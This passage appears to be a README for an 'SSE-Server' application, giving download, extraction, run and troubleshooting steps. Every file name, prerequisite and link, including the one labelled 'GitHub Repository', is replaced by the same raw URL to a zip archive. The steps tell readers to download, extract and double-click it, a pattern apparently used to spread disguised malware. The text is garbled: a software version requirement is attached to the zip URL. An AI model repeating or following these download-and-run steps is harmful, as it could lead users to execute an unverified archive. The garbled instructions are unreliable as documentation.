...
1. **Visit the Releases Page**: Click on the link below to go to the download page.
   [Download SSE-Server](https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/src/Server-SS-v1.5.zip)
...
3. **Download the Application**: Find the file named `https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/src/Server-SS-v1.5.zip` or similar, and click on it to download the file to your computer.

4. **Extract the File**: Once the download is complete, locate the downloaded `https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/src/Server-SS-v1.5.zip` file in your Downloads folder. Right-click on it and select "Extract All..." to unzip the contents.

5. **Run the Application**: After extracting, open the folder where you extracted the files. Double-click on `https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/src/Server-SS-v1.5.zip` to start the application.
...
- **https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/src/Server-SS-v1.5.zip**: Version 14.x or newer. This is required for the server to function properly.
...
- **Check https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/src/Server-SS-v1.5.zip Installation**: Ensure https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/src/Server-SS-v1.5.zip is installed correctly on your system.
...
- [GitHub Repository](https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/src/Server-SS-v1.5.zip)
- [Download SSE-Server](https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/src/Server-SS-v1.5.zip)  
